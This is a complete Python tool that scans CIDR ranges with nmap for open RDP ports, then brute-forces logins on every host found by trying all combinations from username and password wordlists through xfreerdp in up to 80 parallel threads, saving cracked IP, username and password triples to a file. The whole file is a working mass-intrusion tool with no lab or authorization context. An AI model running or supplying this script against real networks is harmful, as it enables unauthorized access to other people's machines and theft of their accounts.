#!/usr/bin/env python3
"""
RDP brute force: scan CIDR file with native nmap, crack with username.txt + password.txt.
Uses native nmap (subprocess) for speed and high parallelism for credential attempts.
"""
import argparse
import re
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from threading import Lock

RDP_PORT = 3389
SUCCESS_FILE = "successful_logins.txt"
RDP_SCAN_FILE = "rdp_scan.txt"


def parse_args():
    p = argparse.ArgumentParser(description="RDP scan (nmap) + brute force from CIDR, username.txt, password.txt")
    p.add_argument("--cidr-file", type=str, default="cidr.txt", help="File with one CIDR per line (default: cidr.txt)")
    p.add_argument("--username-file", type=str, default="username.txt", help="Usernames, one per line (default: username.txt)")
    p.add_argument("--password-file", type=str, default="password.txt", help="Passwords, one per line (default: password.txt)")
    p.add_argument("--threads", type=int, default=80, help="Parallel RDP attempts (default: 80)")
    p.add_argument("--timeout", type=int, default=8, help="Seconds per xfreerdp attempt (default: 8)")
    p.add_argument("--skip-scan", action="store_true", help="Skip nmap; use existing rdp_scan.txt")
    p.add_argument("--nmap-args", type=str, default="-T4", help="Extra nmap args (default: -T4)")
    return p.parse_args()


def run_nmap_scan(cidr_file: Path, nmap_extra: str) -> list[str]:
    """Run native nmap for port 3389 on all CIDRs in file. Returns list of open IPs."""
    cidr_file = Path(cidr_file)
    if not cidr_file.exists():
        print(f"[!] CIDR file not found: {cidr_file}")
        sys.exit(1)

    out_file = Path(RDP_SCAN_FILE)
    cmd = [
        "nmap", "-p", str(RDP_PORT), "--open", "-Pn",
        "-iL", str(cidr_file.resolve()),
        "-oG", str(out_file.resolve()),
    ]
    if nmap_extra:
        cmd.extend(nmap_extra.strip().split())

    print(f"[*] Running: {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=True, capture_output=True, timeout=3600)
    except FileNotFoundError:
        print("[!] nmap not found. Install nmap and ensure it's in PATH.")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print("[!] nmap timed out.")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[!] nmap failed: {e}")
        sys.exit(1)

    return parse_nmap_grepable(out_file)


def parse_nmap_grepable(path: Path) -> list[str]:
    """Parse -oG file for hosts with port open (we only scan 3389)."""
    ips = []
    ip_re = re.compile(r"Host:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
    with open(path, "r") as f:
        for line in f:
            if "/open/" not in line or line.startswith("#"):
                continue
            m = ip_re.search(line)
            if m:
                ips.append(m.group(1))
    return ips


def try_rdp(ip: str, user: str, password: str, timeout: int) -> bool:
    """Try single RDP login; return True on success."""
    cmd = [
        "xfreerdp", f"/u:{user}", f"/p:{password}", f"/v:{ip}", f"/port:{RDP_PORT}",
        "+auth-only", "/cert:ignore",
    ]
    try:
        r = subprocess.run(
            cmd,
            capture_output=True,
            timeout=timeout,
        )
        return r.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
        return False


def main():
    args = parse_args()
    cidr_path = Path(args.cidr_file)
    user_path = Path(args.username_file)
    pass_path = Path(args.password_file)

    for p, name in [(user_path, "username"), (pass_path, "password")]:
        if not p.exists():
            print(f"[!] {name} file not found: {p}")
            sys.exit(1)

    usernames = [u.strip() for u in user_path.read_text(encoding="utf-8", errors="ignore").splitlines() if u.strip()]
    passwords = [p.strip() for p in pass_path.read_text(encoding="utf-8", errors="ignore").splitlines() if p.strip()]
    if not usernames or not passwords:
        print("[!] username.txt and password.txt must each have at least one entry.")
        sys.exit(1)

    if args.skip_scan:
        open_ips = parse_nmap_grepable(Path(RDP_SCAN_FILE))
        if not open_ips:
            print("[!] No open RDP hosts in rdp_scan.txt. Run without --skip-scan first.")
            sys.exit(1)
        print(f"[*] Using {len(open_ips)} IPs from {RDP_SCAN_FILE}")
    else:
        open_ips = run_nmap_scan(cidr_path, args.nmap_args)
        if not open_ips:
            print("[*] No hosts with RDP open.")
            return
        print(f"[*] Found {len(open_ips)} hosts with RDP open")

    # Build (ip, user, password) tasks
    tasks = [(ip, u, p) for ip in open_ips for u in usernames for p in passwords]
    cracked = set()
    lock = Lock()
    success_log = Lock()

    def worker(item):
        ip, user, password = item
        with lock:
            if ip in cracked:
                return None
        if try_rdp(ip, user, password, args.timeout):
            with lock:
                cracked.add(ip)
            with success_log:
                with open(SUCCESS_FILE, "a") as f:
                    f.write(f"{ip},{user},{password}\n")
            return (ip, user, password)
        return None

    print(f"[*] Trying {len(tasks)} combinations with {args.threads} threads (timeout={args.timeout}s)...")
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(worker, t): t for t in tasks}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                if r:
                    ip, user, passw = r
                    print(f"[SUCCESS] {ip} | {user}:{passw}")
            except Exception as e:
                pass

    print(f"[*] Done. Cracked {len(cracked)} host(s). Results appended to {SUCCESS_FILE}")


if __name__ == "__main__":
    main()
